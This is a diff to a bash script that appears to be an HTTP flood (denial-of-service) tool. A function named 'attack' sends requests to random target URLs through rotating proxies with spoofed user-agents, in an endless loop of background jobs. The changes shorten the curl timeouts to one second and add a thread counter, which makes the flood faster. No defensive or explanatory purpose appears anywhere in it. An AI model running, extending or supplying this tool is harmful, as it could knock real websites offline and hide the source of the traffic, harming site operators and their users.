@@ -39,7 +39,7 @@ else
 fi
 
 #cURL parameters
-CURL="$CURL -s -o /dev/null --retry 0 -w %{http_code} -m 30"
+CURL="$CURL -s -o /dev/null --retry 0 -w %{http_code} -m 1 --keepalive-time 1 --connect-timeout 1"
 
 #Proxy list file
 PROXY_FILE="proxy.cfg"
@@ -79,11 +79,13 @@ function attack()
     local URL=$1
     local P=$2
     local H=$3
+    local THREADS=$4
     RESULT=`$CURL -H user-agent:"$H" -x $P $URL &`
 
     #Print result
     echo -e "$URL"
     echo -e "HTTP Status : $RESULT\tProxy : $P"
+    echo -e "Current threads : $THREADS"
 }
 
 while [ 1 ]
@@ -105,6 +107,6 @@ do
 	T_R=${T[$RANDOM%TT]}
 
 	#ATTACK!
-        attack $T_R $P_R "$H_R" &
+        attack $T_R $P_R "$H_R" $THREAD &
     fi
 done
